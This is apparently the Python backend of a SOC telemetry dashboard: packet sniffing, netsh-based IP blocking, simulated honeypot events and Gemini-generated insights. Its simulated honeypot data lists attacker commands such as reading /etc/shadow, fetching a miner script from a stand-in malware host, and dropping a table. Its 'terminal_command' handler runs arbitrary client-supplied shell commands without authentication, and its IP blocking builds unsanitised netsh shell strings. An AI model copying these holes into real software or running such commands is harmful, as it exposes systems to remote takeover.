import os
import sys
import asyncio

if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
import logging
from fastapi import FastAPI
from fastapi.responses import FileResponse
import socketio
from sniffer import start_sniffing, start_pcap_capture, stop_pcap_capture
import google.generativeai as genai
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY")
if GEMINI_API_KEY:
    genai.configure(api_key=GEMINI_API_KEY)
    model = genai.GenerativeModel('gemini-2.5-flash')
else:
    model = None

sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')
fastapi_app = FastAPI(title="SOC Dashboard Telemetry Sensor")
app = socketio.ASGIApp(sio, other_asgi_app=fastapi_app)

packet_queue = asyncio.Queue()
recent_packets = []
packets_logged = 0

blocked_countries = set()
blocked_ips = set()

def block_ip_in_firewall(ip):
    try:
        if ip in blocked_ips:
            return True
        import subprocess
        cmd = f'netsh advfirewall firewall add rule name="SOC-Block-{ip}" dir=in action=block remoteip={ip}'
        subprocess.run(cmd, shell=True, check=True, capture_output=True)
        blocked_ips.add(ip)
        logger.info(f"Successfully blocked {ip} in Windows Firewall.")
        return True
    except Exception as e:
        logger.error(f"Failed to block {ip} in firewall: {e}")
        return False

@sio.on('connect')
async def on_connect(sid, environ):
    logger.info(f"Frontend connected via WebSocket: {sid}")

@sio.on('disconnect')
async def on_disconnect(sid):
    logger.info(f"Frontend disconnected: {sid}")

@sio.on('geo_block')
async def on_geo_block(sid, data):
    country_code = data.get('countryCode')
    block = data.get('block', True)
    if not country_code: return
    if block:
        blocked_countries.add(country_code)
        logger.info(f"SOC Dashboard: Blocked country {country_code}")
    else:
        blocked_countries.discard(country_code)
        logger.info(f"SOC Dashboard: Unblocked country {country_code}")

@sio.on('clear_firewall')
async def on_clear_firewall(sid):
    import subprocess
    deleted_count = 0
    for ip in list(blocked_ips):
        try:
            cmd = f'netsh advfirewall firewall delete rule name="SOC-Block-{ip}" dir=in'
            subprocess.run(cmd, shell=True, check=True, capture_output=True)
            deleted_count += 1
            logger.info(f"Deleted firewall rule for {ip}")
        except Exception as e:
            logger.error(f"Failed to delete firewall rule for {ip}: {e}")
    
    blocked_ips.clear()
    blocked_countries.clear()
    logger.info(f"Flushed all SOC firewall rules. Total deleted: {deleted_count}")

@sio.on('terminal_command')
async def on_terminal_command(sid, data):
    cmd = data.get('cmd', '').strip()
    if not cmd: return
    
    parts = cmd.split()
    base_cmd = parts[0].lower()
    if base_cmd == 'block':
        if len(parts) > 1:
            target = parts[1]
            success = block_ip_in_firewall(target)
            if success:
                await sio.emit('terminal_output', {'output': [
                    f"[+] Adding {target} to blocklist...",
                    f'netsh advfirewall firewall add rule name="SOC-Block-{target}" dir=in action=block remoteip={target}',
                    "[+] Rule applied successfully",
                    f"[+] IP {target} blocked at perimeter firewall"
                ]}, room=sid)
            else:
                await sio.emit('terminal_output', {'output': [f"[-] Failed to block {target}"]}, room=sid)
    elif base_cmd == 'flush':
        import subprocess
        deleted_count = 0
        for ip in list(blocked_ips):
            try:
                flush_cmd = f'netsh advfirewall firewall delete rule name="SOC-Block-{ip}" dir=in'
                subprocess.run(flush_cmd, shell=True, check=True, capture_output=True)
                deleted_count += 1
            except Exception:
                pass
        blocked_ips.clear()
        blocked_countries.clear()
        await sio.emit('terminal_output', {'output': [
            f"[+] Flushed all SOC firewall rules.",
            f"[+] Total rules deleted: {deleted_count}",
            f"[+] System connectivity restored."
        ]}, room=sid)
    else:
        # Execute any other command using the real shell via a background thread
        try:
            loop = asyncio.get_running_loop()
            
            def run_stream_cmd(command, target_sid):
                import subprocess
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )
                for line in proc.stdout:
                    line_str = line.strip()
                    if line_str:
                        asyncio.run_coroutine_threadsafe(
                            sio.emit('terminal_output', {'output': [line_str]}, room=target_sid),
                            loop
                        )
                proc.wait()

            await asyncio.to_thread(run_stream_cmd, cmd, sid)
            
        except Exception as e:
            logger.exception("Shell execution failed:")
            await sio.emit('terminal_output', {'output': [f"Error executing command: {e}"]}, room=sid)

@sio.on('send_webhook')
async def on_send_webhook(sid, data):
    url = data.get('url')
    payload = data.get('payload')
    if not url or not payload:
        return
        
    def _send_req():
        import urllib.request
        import json
        try:
            req = urllib.request.Request(
                url, 
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json', 'User-Agent': 'SOC-Dashboard/1.0'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=5) as response:
                pass
        except Exception as e:
            logger.error(f"Webhook failed: {e}")

    # Fire and forget in a separate thread
    import asyncio
    asyncio.create_task(asyncio.to_thread(_send_req))

@sio.on('start_pcap')
async def on_start_pcap(sid):
    logger.info("Starting PCAP capture requested by frontend.")
    start_pcap_capture("capture.pcap")

@sio.on('stop_pcap')
async def on_stop_pcap(sid):
    logger.info("Stopping PCAP capture requested by frontend.")
    stop_pcap_capture()

@fastapi_app.get("/api/download_pcap")
def download_pcap():
    filepath = "capture.pcap"
    if os.path.exists(filepath):
        return FileResponse(filepath, media_type="application/vnd.tcpdump.pcap", filename="soc_capture.pcap")
    return {"error": "PCAP file not found"}

async def broadcast_telemetry():
    while True:
        try:
            threat = await packet_queue.get()
            global packets_logged
            if packets_logged < 5:
                logger.info(f"Sniffed packet: {threat['srcIp']} -> {threat['dstIp']} ({threat['attackType']})")
                packets_logged += 1
                
            # Check Geo-block and IP block status dynamically
            country_code = threat.get('srcGeo', {}).get('countryCode')
            if country_code in blocked_countries:
                block_ip_in_firewall(threat['srcIp'])
                threat['isBlocked'] = True
                
            if threat['srcIp'] in blocked_ips:
                threat['isBlocked'] = True
                
            # Check for Honeypot traps
            HONEYPOT_MAP = {
                22: 'SSH',
                23: 'Telnet', 2323: 'Telnet',
                80: 'HTTP', 8080: 'HTTP',
                3306: 'MySQL',
                21: 'FTP'
            }
            
            dst_port = threat.get('dstPort')
            if dst_port in HONEYPOT_MAP:
                import uuid
                hp_service = HONEYPOT_MAP[dst_port]
                # Simulate payload extraction based on service
                cmds = []
                creds = None
                if hp_service == 'SSH':
                    cmds = ['cat /etc/shadow', 'wget http://malware.site/miner.sh']
                    creds = {'username': 'root', 'password': 'password123'}
                elif hp_service == 'Telnet':
                    cmds = ['enable', 'system shell', 'sh']
                    creds = {'username': 'admin', 'password': '123'}
                elif hp_service == 'HTTP':
                    cmds = ['GET /.env HTTP/1.1', 'POST /api/upload HTTP/1.1']
                elif hp_service == 'MySQL':
                    cmds = ["SELECT user, host FROM mysql.user;", "DROP TABLE users;"]
                    creds = {'username': 'root', 'password': ''}
                else:
                    cmds = ['USER anonymous', 'PASS anonymous']
                    
                honeypot_event = {
                    "id": str(uuid.uuid4()),
                    "service": hp_service,
                    "port": dst_port,
                    "srcIp": threat['srcIp'],
                    "srcGeo": threat['srcGeo'],
                    "timestamp": threat['timestamp'],
                    "commands": cmds,
                    "credentials": creds,
                    "severity": "HIGH",
                    "sessionId": f"hx-{str(uuid.uuid4())[:8]}"
                }
                await sio.emit('honeypot_event', honeypot_event)

            recent_packets.append(threat)
            if len(recent_packets) > 100:
                recent_packets.pop(0)
            await sio.emit('packet_telemetry', threat)
            packet_queue.task_done()
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Error broadcasting telemetry: {e}")

async def ai_insight_loop():
    if not model:
        logger.warning("No GEMINI_API_KEY provided. AI insights disabled.")
        return

    # Conservative interval — free tier is 20 req/day = 1 every ~72 min
    NORMAL_INTERVAL = 90 * 60   # 90 minutes between calls
    BACKOFF_INTERVAL = 6 * 3600  # 6 hour backoff after 429

    await asyncio.sleep(60)  # initial delay after startup

    while True:
        try:
            if not recent_packets:
                await asyncio.sleep(NORMAL_INTERVAL)
                continue

            attacks = {}
            countries = {}
            criticals = 0

            for p in recent_packets:
                attacks[p['attackType']] = attacks.get(p['attackType'], 0) + 1
                countries[p['srcGeo']['country']] = countries.get(p['srcGeo']['country'], 0) + 1
                if p['severity'] == 'CRITICAL':
                    criticals += 1

            top_attack = max(attacks, key=attacks.get) if attacks else "None"
            top_country = max(countries, key=countries.get) if countries else "None"

            prompt = (
                f"Act as a Senior SOC Analyst. I have seen {len(recent_packets)} recent network packets. "
                f"{criticals} are CRITICAL. The top attack type is '{top_attack}', mostly from {top_country}. "
                f"Write a 1-2 sentence tactical recommendation for the dashboard. "
                f"Keep it concise, professional, and directly actionable. Do not use markdown."
            )

            response = await asyncio.to_thread(model.generate_content, prompt)
            insight_text = response.text.replace('\n', ' ').strip()
            logger.info(f"Generated AI Insight: {insight_text}")
            await sio.emit('ai_insight', insight_text)

            await asyncio.sleep(NORMAL_INTERVAL)

        except asyncio.CancelledError:
            break
        except Exception as e:
            err_str = str(e)
            logger.error(f"Error generating AI insight: {e}")
            if "429" in err_str:
                # Parse retry_delay from error if available, else use long backoff
                import re
                match = re.search(r'retry_delay\s*\{\s*seconds:\s*(\d+)', err_str)
                wait_secs = int(match.group(1)) + 5 if match else BACKOFF_INTERVAL
                logger.warning(f"Rate limited by Gemini API. Waiting {wait_secs}s before retry.")
                await sio.emit('ai_insight', "Gemini AI quota reached for today. Analysis will resume automatically tomorrow.")
                await asyncio.sleep(wait_secs)
            else:
                await sio.emit('ai_insight', "AI Threat Insights temporarily offline. Reverting to local heuristic analysis.")
                await asyncio.sleep(NORMAL_INTERVAL)

@fastapi_app.on_event("startup")
async def startup_event():
    loop = asyncio.get_running_loop()
    asyncio.create_task(broadcast_telemetry())
    asyncio.create_task(ai_insight_loop())
    start_sniffing(packet_queue, loop)
    logger.info("Telemetry Sensor Backend Started.")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="127.0.0.1", port=8000, reload=True)
